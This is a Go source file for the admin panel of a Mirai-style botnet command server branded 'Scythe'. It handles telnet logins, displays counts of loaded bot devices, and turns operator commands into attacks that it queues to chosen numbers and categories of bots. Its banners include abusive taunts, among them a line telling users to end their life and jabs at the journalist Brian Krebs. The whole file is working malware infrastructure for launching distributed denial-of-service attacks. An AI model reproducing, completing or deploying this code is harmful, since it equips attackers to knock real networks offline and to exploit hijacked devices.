package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    headerb, err := ioutil.ReadFile("prompt.txt")
    if err != nil {
        return
    }

    header := string(headerb)
    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;35mUsuario: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;35mPasar: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[1;37mAccount Ifno Being Checked \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1mPlease sir, end your life thank you!\r\n"))
        this.conn.Write([]byte("\033[31mType Brian Krebs to disconnect.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    for i := 0; i < 15; i++ {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write(append([]byte("\r\033[1;37mConnecting To \033[1;35mKrebs On Security \033[31m"),  spinBuf[i % len(spinBuf)]))
        time.Sleep(100 * time.Millisecond)
    }
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;35m                ...                               \r\n"))
    this.conn.Write([]byte("\033[1;35m              ;::::;                              \r\n"))
    this.conn.Write([]byte("\033[1;35m            ;::::; :;                             \r\n"))
    this.conn.Write([]byte("\033[1;35m          ;:::::'   :;                            \r\n"))
    this.conn.Write([]byte("\033[1;35m         ;:::::;     ;.                           \r\n"))
    this.conn.Write([]byte("\033[1;35m        ,:::::'       ;           OOO             \r\n"))
    this.conn.Write([]byte("\033[1;35m        ::::::;       ;          OOOOO            \r\n"))
    this.conn.Write([]byte("\033[1;35m        ;:::::;       ;         OOOOOOOO          \r\n"))	
    this.conn.Write([]byte("\033[1;35m       ,;::::::;     ;'         / OOOOOOO         \r\n"))
    this.conn.Write([]byte("\033[1;35m     ;:::::::::`. ,,,;.        /  / DOOOOOO       \r\n"))	
    this.conn.Write([]byte("\033[1;35m   .';:::::::::::::::::;,     /  /     DOOOO      \r\n"))	
    this.conn.Write([]byte("\033[1;35m  ,::::::;::::::;;;;::::;,   /  /        DOOO     \r\n"))	
    this.conn.Write([]byte("\033[1;35m ;`::::::`'::::::;;;::::: ,#/  /          DOOO    \r\n"))	
    this.conn.Write([]byte("\033[1;35m :`:::::::`;::::::;;::: ;::#  /            DOOO   \r\n"))	
    this.conn.Write([]byte("\033[1;35m ::`:::::::`;:::::::: ;::::# /              DOO   \r\n"))	
    this.conn.Write([]byte("\033[1;35m `:`:::::::`;:::::: ;::::::#/               DOO   \r\n"))	
    this.conn.Write([]byte("\033[1;35m  :::`:::::::`;; ;:::::::::##                OO   \r\n"))	
    this.conn.Write([]byte("\033[1;35m  ::::`:::::::`;::::::::;:::#                OO   \r\n"))	
    this.conn.Write([]byte("\033[1;35m  `:::::`::::::::::::;'`:;::#                O    \r\n"))	
    this.conn.Write([]byte("\033[1;35m   `:::::`::::::::;' /  / `:#                     \r\n"))	
    this.conn.Write([]byte("\033[1;35m                                                  \r\n"))
    this.conn.Write([]byte("\033[1;35m           Welcome To The Sythe Botnet            \r\n"))
    this.conn.Write([]byte("\033[1;35m              Type ? To Get Started               \r\n"))
    this.conn.Write([]byte("\033[1;35m                                                  \r\n"))

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;>> %d << Loaded Devices | Account >> %s << \007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;37m" + username + "\033[1;36m@\033[1;35mscythe\033[1;36m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "clear" {
            for i := 0; i < 15; i++ {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write(append([]byte("\r\033[1;37mScythe Refreshing Please Wait \033[31m"),  spinBuf[i % len(spinBuf)]))
            time.Sleep(300 * time.Millisecond)
        }
        this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\033[1;35m                                                                          \r\n"))	
		this.conn.Write([]byte("\033[1;35m   ▄████████  ▄████████ ▄██   ▄       ███        ▄█    █▄       ▄████████ \r\n"))
		this.conn.Write([]byte("\033[1;35m  ███    ███ ███    ███ ███   ██▄ ▀█████████▄   ███    ███     ███    ███ \r\n"))
		this.conn.Write([]byte("\033[1;35m  ███    █▀  ███    █▀  ███▄▄▄███    ▀███▀▀██   ███    ███     ███    █▀  \r\n"))
		this.conn.Write([]byte("\033[1;35m  ███        ███        ▀▀▀▀▀▀███     ███   ▀  ▄███▄▄▄▄███▄▄  ▄███▄▄▄     \r\n"))
		this.conn.Write([]byte("\033[1;35m▀███████████ ███        ▄██   ███     ███     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     \r\n"))	
		this.conn.Write([]byte("\033[1;35m         ███ ███    █▄  ███   ███     ███       ███    ███     ███    █▄  \r\n"))
		this.conn.Write([]byte("\033[1;35m   ▄█    ███ ███    ███ ███   ███     ███       ███    ███     ███    ███ \r\n"))	
		this.conn.Write([]byte("\033[1;35m ▄████████▀  ████████▀   ▀█████▀     ▄████▀     ███    █▀      ██████████ \r\n"))	
		this.conn.Write([]byte("\033[1;35m                                                                          \r\n"))	
        continue
        }

        if userInfo.admin == 1 && cmd == "botcount" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
